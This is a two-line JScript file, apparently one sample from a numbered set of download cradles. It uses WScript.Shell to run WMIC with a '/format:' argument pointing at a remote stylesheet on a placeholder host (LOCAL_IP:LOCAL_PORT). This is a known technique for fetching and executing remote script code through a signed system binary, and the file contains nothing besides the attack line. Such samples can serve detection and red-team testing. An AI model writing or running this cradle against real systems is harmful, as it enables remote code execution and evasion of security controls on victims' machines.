var WshShell = new ActiveXObject("Wscript.Shell");
WshShell.run('wmic process get brief /format:"http://LOCAL_IP:LOCAL_PORT/HTTP_05_wmic_call.js"');